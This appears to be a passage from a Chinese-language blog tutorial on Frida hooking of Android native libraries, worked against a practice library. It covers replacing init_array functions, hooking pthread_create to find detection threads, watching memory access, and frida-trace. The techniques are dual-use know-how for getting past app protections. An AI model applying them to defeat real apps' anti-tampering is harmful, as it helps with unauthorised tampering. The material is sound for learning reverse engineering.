<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">addr, soName, callback</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> soPath = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(soPath.<span class="title function_">indexOf</span>(soName) != -<span class="number">1</span>) <span class="title function_">callback</span>();</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(dlopen, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_call_constructors);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(android_dlopen_ext, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_call_constructors);</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举符号Hook call_constructors</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_call_constructors</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _symbols = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;linker64&quot;</span>).<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">var</span> call_constructors_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; _symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> _symbol = _symbols[i];</span><br><span class="line">        <span class="keyword">if</span>(_symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;call_constructors&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            call_constructors_addr = _symbol.<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(call_constructors_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        	<span class="title function_">hook_initarray</span>();</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这才是业务代码，上面的都是为这个做铺垫</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_initarray</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xiaojianbangAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> func1_addr = xiaojianbangAddr.<span class="title function_">add</span>(<span class="number">0x1D14</span>);</span><br><span class="line">    <span class="keyword">var</span> func2_addr = xiaojianbangAddr.<span class="title function_">add</span>(<span class="number">0x1D3C</span>);</span><br><span class="line">    <span class="keyword">var</span> func3_addr = xiaojianbangAddr.<span class="title function_">add</span>(<span class="number">0x1CEC</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(func1_addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;func1 is replaced!!!&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&#x27;void&#x27;</span>, []));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(func2_addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;func2 is replaced!!!&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&#x27;void&#x27;</span>, []));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(func3_addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;func3 is replaced!!!&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&#x27;void&#x27;</span>, []));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">detachAll</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hook-pthread-create"><a href="#Hook-pthread-create" class="headerlink" title="Hook pthread_create"></a>Hook pthread_create</h3><p>一些用于检测的函数通常需要实时运行，就有可能用到pthrea_create开启一个子线程。通过Hook这个函数，可以查看App应用程序为哪些函数开启了线程，就可以有针对性的去分析这些函数的代码逻辑是否与检测相关</p>
<p>其源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int <span class="title function_">pthread_create</span>(pthread * tidp,<span class="keyword">const</span> pthread_attr_t * attr,<span class="keyword">void</span> * (* start_rtn)(<span class="keyword">void</span>*),<span class="keyword">void</span> * arg);</span><br></pre></td></tr></table></figure>

<p>第0个参数为指向线程标识符的指针，第一个参数用来设置线程属性，第二个参数是线程运行函数的起始地址，最后一个参数是传递给线程运行函数的参数</p>
<p>实现代码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(pthread_create_addr,&#123;</span><br><span class="line">    <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(args[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Module</span> != <span class="literal">null</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Module</span>.<span class="property">name</span>, args[<span class="number">2</span>].<span class="title function_">sub</span>(<span class="title class_">Module</span>.<span class="property">base</span>));</span><br><span class="line">    &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x7ffeaa98f8 0x0 0x7557c08d8c 0x0 </span></span><br><span class="line"><span class="comment">//libxiaojianbang.so 0x1d8c</span></span><br></pre></td></tr></table></figure>

<h3 id="监控内存读写"><a href="#监控内存读写" class="headerlink" title="监控内存读写"></a>监控内存读写</h3><p>使用Process.setExceptionHandler(callback)可以设置异常处理回调函数。当异常触发时，会调用该函数。在该回调函数中，可通过修改寄存器和内存来让程序从异常中恢复。如果处理了异常，函数最后需要返回true，Frida会立即恢复线程。</p>
<p>直接上代码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">addr, soName, callback</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> soPath = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(soPath.<span class="title function_">indexOf</span>(soName) != -<span class="number">1</span>) <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hook</span>) &#123;<span class="title function_">callback</span>()&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(dlopen, <span class="string">&quot;libxiaojianbang.so&quot;</span>, set_read_write_break);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(android_dlopen_ext, <span class="string">&quot;libxiaojianbang.so&quot;</span>, set_read_write_break);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_read_write_break</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Process</span>.<span class="title function_">setExceptionHandler</span>(<span class="keyword">function</span>(<span class="params">details</span>) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(details, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">protect</span>(details.<span class="property">memory</span>.<span class="property">address</span>, <span class="title class_">Process</span>.<span class="property">pointerSize</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x3DED</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(addr, <span class="number">8</span>, <span class="string">&#x27;---&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;message&quot;: &quot;access violation accessing 0x75ecd31e6b&quot;,</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;access-violation&quot;,</span></span><br><span class="line"><span class="comment">  &quot;address&quot;: &quot;0x767e9e75c4&quot;,</span></span><br><span class="line"><span class="comment">  &quot;memory&quot;: &#123;</span></span><br><span class="line"><span class="comment">    &quot;operation&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="comment">    &quot;address&quot;: &quot;0x75ecd31e6b&quot;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &quot;context&quot;: &#123;</span></span><br><span class="line"><span class="comment">    &quot;pc&quot;: &quot;0x767e9e75c4&quot;,</span></span><br><span class="line"><span class="comment">    &quot;sp&quot;: &quot;0x7fc2481e50&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x0&quot;: &quot;0x7681a52188&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x1&quot;: &quot;0x75ecd31e6b&quot;,</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">    &quot;lr&quot;: &quot;0x767e9e73f8&quot;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &quot;nativeContext&quot;: &quot;0x7fc2480c70&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>上述代码先Hook乐dlopen函数，然后在onLeave函数中执行set_read_write_break，该函数中，首先设置异常回调，接着把需要监控的内存区域权限设置为”—-”,当异常发生时，会调用异常回调函数，该回调函数接受一个参数，details。该参数是一个对象，记录了发生异常的消息描述message,异常的类型-type,发生异常的地址，发生异常时访问的内存地址以及发生异常时的寄存器信息。还可以在回调函数中打印函数栈，获取地址对应的符号信息等</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">addr, soName, callback</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> soPath = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(soPath.<span class="title function_">indexOf</span>(soName) != -<span class="number">1</span>) <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hook</span>) &#123;<span class="title function_">callback</span>()&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(dlopen, <span class="string">&quot;libxiaojianbang.so&quot;</span>, set_read_write_break);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(android_dlopen_ext, <span class="string">&quot;libxiaojianbang.so&quot;</span>, set_read_write_break);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_read_write_break</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Process</span>.<span class="title function_">setExceptionHandler</span>(<span class="keyword">function</span>(<span class="params">details</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(details, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lr&quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(details.<span class="property">context</span>.<span class="property">lr</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pc&quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(details.<span class="property">context</span>.<span class="property">pc</span>));</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">protect</span>(details.<span class="property">memory</span>.<span class="property">address</span>, <span class="title class_">Process</span>.<span class="property">pointerSize</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(details.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x3DED</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(addr, <span class="number">8</span>, <span class="string">&#x27;---&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;message&quot;: &quot;access violation accessing 0x75eaff1e6b&quot;,</span></span><br><span class="line"><span class="comment">  ......</span></span><br><span class="line"><span class="comment">  &quot;nativeContext&quot;: &quot;0x7fc2480c70&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">lr 0x767e9e73f8 libc.so!__vfprintf+0x3c</span></span><br><span class="line"><span class="comment">pc 0x767e9e75c4 libc.so!__vfprintf+0x208</span></span><br><span class="line"><span class="comment">0x767e9e73f8 libc.so!__vfprintf+0x3c</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0x75eafefe08 libxiaojianbang.so!_Z6myInitv+0x20</span></span><br><span class="line"><span class="comment">0x75eafefe34 libxiaojianbang.so!JNI_OnLoad+0x24</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>但是由于Memory.protect修改的时内存页的权限，并不只是修改给定字节数的权限，所以会存在误差，导致监控内存读写的位置不是很精确。监控内存读写最推荐使用的是使用unidbg，这是一个基于unicorn开发的，在PC端模拟执行so文件的框架。</p>
<p>先插个眼</p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so/unidbg-baadad1eb519480f86f2c577f14a50e8">unidbg</a></p>
<h3 id="函数追踪工具frida-trace"><a href="#函数追踪工具frida-trace" class="headerlink" title="函数追踪工具frida-trace"></a>函数追踪工具frida-trace</h3><p>IDA插件:trace_natives</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Pr0214/trace_natives">https://github.com/Pr0214/trace_natives</a></p>
<p> 用该插件获取so文件代码段中的所有函数的偏移地址后，再配合frida-trace就可以打印函数内部调用流程。</p>
<p>通过修改traceNatives.py中的代码，可以自行调整汇编指令多余几行的函数地址记录在txt文件中</p>
<p>trace_natives用来生成frida-trace运行时所需的参数，而真正的Hook由frida-trace来完成</p>
<p>并且，frida-trace还支持正则表达式模糊匹配来批量Hook java方法，Hook所有静态注册的jni函数等。代码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -<span class="variable constant_">UF</span> -j <span class="string">&#x27;*!*certificate*/isu&#x27;</span></span><br><span class="line">frida-trace -<span class="variable constant_">UF</span> -i <span class="string">&quot;Java_*&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida-API的简单封装"><a href="#Frida-API的简单封装" class="headerlink" title="Frida API的简单封装"></a>Frida API的简单封装</h3><p>eeeee，这个感觉没啥好特别注意的。直接上示例代码吧</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="title function_">hookAddr</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x1ACC</span>), <span class="number">5</span>); 	<span class="comment">// Java_com_xiaojianbang_ndk_NativeHelper_add</span></span><br><span class="line"><span class="title function_">hookAddr</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x22A0</span>), <span class="number">3</span>); 	<span class="comment">// MD5Update</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookAddr</span>(<span class="params">funcAddr, paramsNum</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(funcAddr);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">logs</span> = [];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">params</span> = [];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">logs</span>.<span class="title function_">push</span>(<span class="string">&quot;call &quot;</span> + <span class="variable language_">module</span>.<span class="property">name</span> + <span class="string">&quot;!&quot;</span> + <span class="title function_">ptr</span>(funcAddr).<span class="title function_">sub</span>(<span class="variable language_">module</span>.<span class="property">base</span>) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paramsNum; i++)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">params</span>.<span class="title function_">push</span>(args[i]);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">logs</span>.<span class="title function_">push</span>(<span class="string">&quot;this.args&quot;</span> + i + <span class="string">&quot; onEnter: &quot;</span> + <span class="title function_">printAddr</span>(args[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paramsNum; i++)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">logs</span>.<span class="title function_">push</span>(<span class="string">&quot;this.args&quot;</span> + i + <span class="string">&quot; onLeave: &quot;</span> + <span class="title function_">printAddr</span>(<span class="variable language_">this</span>.<span class="property">params</span>[i]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">logs</span>.<span class="title function_">push</span>(<span class="string">&quot;retval onLeave: &quot;</span> + <span class="title function_">printAddr</span>(retval) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">logs</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printAddr</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findRangeByAddress</span>(addr);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">module</span> != <span class="literal">null</span>) <span class="keyword">return</span> <span class="title function_">hexdump</span>(addr) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ptr</span>(addr) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">call libxiaojianbang.so!0x1acc</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">,this.args2 onEnter: 0x5</span></span><br><span class="line"><span class="comment">,this.args3 onEnter: 0x6</span></span><br><span class="line"><span class="comment">,this.args4 onEnter: 0x7</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">,this.args2 onLeave: 0x5</span></span><br><span class="line"><span class="comment">,this.args3 onLeave: 0x6</span></span><br><span class="line"><span class="comment">,this.args4 onLeave: 0x7</span></span><br><span class="line"><span class="comment">,retval onLeave: 0x12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">call libxiaojianbang.so!0x22a0</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">,this.args1 onEnter: </span></span><br><span class="line"><span class="comment">7590c56390  78 69 61 6f 6a 69 61 6e 62 61 6e 67 00 00 c0 41  xiaojianbang...A</span></span><br><span class="line"><span class="comment">,this.args2 onEnter: 0xc</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">,this.args1 onLeave: </span></span><br><span class="line"><span class="comment">7590c56390  78 69 61 6f 6a 69 61 6e 62 61 6e 67 00 00 c0 41  xiaojianbang...A</span></span><br><span class="line"><span class="comment">,this.args2 onLeave: 0xc</span></span><br><span class="line"><span class="comment">,retval onLeave: </span></span><br><span class="line"><span class="comment">7fc209c890  78 69 61 6f 6a 69 61 6e 62 61 6e 67 76 00 00 00  xiaojianbangv...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

